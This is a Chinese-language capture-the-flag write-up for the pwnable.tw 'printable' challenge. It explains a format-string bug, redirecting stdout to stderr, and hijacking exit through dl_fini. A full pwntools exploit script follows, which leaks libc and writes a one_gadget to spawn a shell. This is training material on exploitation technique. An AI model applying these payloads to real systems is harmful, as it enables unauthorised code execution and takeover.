# Pwnable Printable


> 有无相生，难以相成，长短相较，高下相倾，音声相和，长短相随。

## 分析

程序逻辑十分简单，输入一段字符后，关闭标准输入，然后有一个裸的字符串漏洞，随后exit退出程序。

由于程序没有开启PIE保护，同时只关闭了stdout没有关闭stderr，因此我们可以利用格式字符串漏洞修改stdout为stderr，从而可以泄露信息。

在修改完stdout后，需要攻击exit，来劫持程序的控制流，再次执行回格式化字符串漏洞。

### exit

exit函数实际执行的是__run_exit_handlers函数。

```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
libc_hidden_def (exit)
```

__run_exit_handlers函数会一次执行exit_function_list结构中的函数，最开始考虑是否可以修改这些结构里面的函数，来劫持exit，后面发现这些函数是通过fs:[0x30]加密后得到的。

````c
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
#ifndef SHARED
  if (&__call_tls_dtors != NULL)
#endif
    if (run_dtors)
      __call_tls_dtors ();

  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (*listp != NULL)
    {
      struct exit_function_list *cur = *listp;

      while (cur->idx > 0)
	{
	  const struct exit_function *const f =
	    &cur->fns[--cur->idx];
	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);

	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (onfct);
#endif
	      onfct (status, f->func.on.arg);
	      break;
	    case ef_at:
	      atfct = f->func.at;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (atfct);
#endif
	      atfct ();
	      break;
	    case ef_cxa:
	      cxafct = f->func.cxa.fn;
#ifdef PTR_DEMANGLE
	      PTR_DEMANGLE (cxafct);
#endif
	      cxafct (f->func.cxa.arg, status);
	      break;
	    }
	}
````

我们利用gdb调试发现exit_function_list执行的第一个函数是dl_fini函数。

![image-20210814193805680](https://gitee.com/nopnoping/img/raw/master/img/image-20210814193805680.png)

进入dl_fini函数，单步调试后，找到一条很有意思的调用语句。rdx恒为0，r12指向fini_array的地址，但是程序开启了FULL REOLE，无法修改fini_array处的值。

![image-20210814194237949](https://gitee.com/nopnoping/img/raw/master/img/image-20210814194237949.png)

通过回溯，发现，rdx的值恒定为0，r12的值是通过在fini_array上加上rbx储存地址上的值得到，并且在执行exit前，该地址被储存在了栈上，所以可以通过格式化字符串修改该地址上的值，从而修改r12指向我们可以修改的地址，进而劫持exit控制流。

![image-20210814194613881](https://gitee.com/nopnoping/img/raw/master/img/image-20210814194613881.png)

![image-20210814194751583](https://gitee.com/nopnoping/img/raw/master/img/image-20210814194751583.png)

**泄露libc**

劫持控制流到main函数中的第一个printf处，这样可以在栈中保留了一些栈地址，利用这些栈地址我们可以修改printf的返回地址，执行第二次劫持，这里不能再次劫持exit的原因是，执行exit_function_list中的函数时，会依次递减idx的值，从而在次进入exit时，idx的值为0，无法执行dl_fini。

**get shell**

这里getshell有两种方法，第一种在栈上构造ROP链，第二种再次攻击exit，这里以第二种方法为例讲解。

上面分析无法第二次执行exit_function_list函数的原因，是因为idx的值递减为零，所以这里利用格式化字符串将idx修改为1，从而可以执行dl_fini。

同样在dl_fini中，在第一次执行后，也有与idx相似的值，被修改，我们需要将其修改回去才能再次执行。

这里以左图第一次执行exit，右图第二次执行exit来说明需要修改的值。

![image-20210814200228293](https://gitee.com/nopnoping/img/raw/master/img/image-20210814200228293.png)

![image-20210814201240865](https://gitee.com/nopnoping/img/raw/master/img/image-20210814201240865.png)

## 实现

````python
from pwn import *

s      = lambda data               :sh.send(data) 
sa      = lambda delim,data         :sh.sendafter(delim, data)
sl      = lambda data               :sh.sendline(data)
sla     = lambda delim,data         :sh.sendlineafter(delim, data)
sea     = lambda delim,data         :sh.sendafter(delim, data)
r      = lambda numb=4096          :sh.recv(numb)
ru      = lambda delims, drop=True  :sh.recvuntil(delims, drop)
info_addr = lambda tag, addr        :sh.info(tag +': {:#x}'.format(addr))
itr     = lambda                    :sh.interactive()

if args['REMOTE']:
    sh=remote('chall.pwnable.tw',10307)
else:
    sh=process("./printable")

if args['I386']:
    context.arch='i386'
else:
    context.arch='amd64'

if args['DEBUG']:
    context.log_level='debug'


def debug(command=''):
    context.terminal = ['tmux', 'splitw', '-v']
    gdb.attach(sh,command)

def exp():
    #debug("b*0x0000000000400948\nc")
    #libc=ELF("/glibc/2.23/64/lib/libc-2.23.so")
    libc=ELF("./libc_64.so.6")
    ru("Input :")
    #offset 6
    #1.edit stdin(0x601020) to stdout (0x5540)
       #modify offset of finiarray (in stack 0x120) => 42 
       #fini array:0x600db8 goal:0x601000=>0x248
       #main:0x4008CF 400916 0x400740 400925
    payload=b"%"+str(0x40).encode()+b"c"+b"%14$hhn"+\
            b"%"+str(0x55-0x40).encode()+b"c"+b"%15$hhn"+\
            b"%"+str(0x248-0x55).encode()+b"c"+b"%42$n"+\
            b"%"+str(0x90c-0x248).encode()+b"c"+b"%16$hn"+\
            b"%"+str(0x40-0x0c).encode()+b"c"+b"%17$hhn"+\
            b"a:"+b"%25$p"+b"::"+\
            p64(0x601020)+p64(0x601021)+p64(0x601000)+p64(0x601002)
    print(len(payload))
    sl(payload)

    #2.leak and attack printf to ret offset:7
    payload=b"%"+str(0xc).encode()+b"c"+b"%14$hhn"+b"~%54$p~"+\
            b"m%16$pm"
    payload=payload.ljust(0x38,b'\x00')
    #payload+=b'\xa0'
    ru("Input :")
    s(payload)
    ru("~")
    libc_base=int(ru("~").decode(),16)-240-libc.symbols["__libc_start_main"]
    ru("m")
    stack=int(ru("m").decode(),16)
    info_addr("stack",stack)
    info_addr("libc_base",libc_base)
    with open("./random.stack",'a') as f:
        f.write(hex(stack)+"\n")
    #gadget 0x3f3d6 0x3f42a 0xd5bf7
    #gadget 0x45216 0x4526a 0xef6c4 0xf0567
    gadget=libc_base+0xf0567
        #for twice call exit
    # initial=libc_base+0x39cc48
    # rtld_local=libc_base+0x5c4048
    # magic=libc_base+0x5c547c
    initial=libc_base+0x3c4c48
    rtld_local=libc_base+0x5ec048
    magic=libc_base+0x5ed47c
    info_addr("gadget",gadget)

    #3.get shell attack exit again
    chrs_now=28
    offset_base=15
    payload=b"a"+b"%"+str(offset_base).encode()+b"$n"
    payload+=b"aaa"+b"%"+str(offset_base+1).encode()+b"$n"
    payload+=b"%24c"+b"%"+str(offset_base+2).encode()+b"$hhn"
    for i in range(3):
        nums=((gadget>>(i*16))&0xffff)
        if nums > chrs_now:
            payload+=b"%"+str(nums-chrs_now).encode()+b"c"+\
                     b"%"+str(offset_base+i+3).encode()+b"$hn"
        elif nums < chrs_now:
            payload+=b"%"+str(nums+0x10000-chrs_now).encode()+b"c"+\
                     b"%"+str(offset_base+i+3).encode()+b"$hn"
        else:
            payload+=b"%"+str(offset_base+i+3).encode()+b"$hn"
        chrs_now=nums
    payload+=b"p" #padding
    payload+=p64(initial)+p64(rtld_local)+p64(magic)
    for i in range(3):
        payload+=p64(0x601000+i*2)
    print(len(payload))
    ru("Input :")
    sl(payload)

    itr()

exp()

````

> 在修改stdout时，会爆破一次，第二次劫持时，栈地址也再次爆破，因此在开启ALSR后，成功的概率为1/256，由于远程的网络太慢，并且测试发现由于ld的不同，栈地址上的数据构造不同，第二次printf的偏移不同，所以远程没有成功。
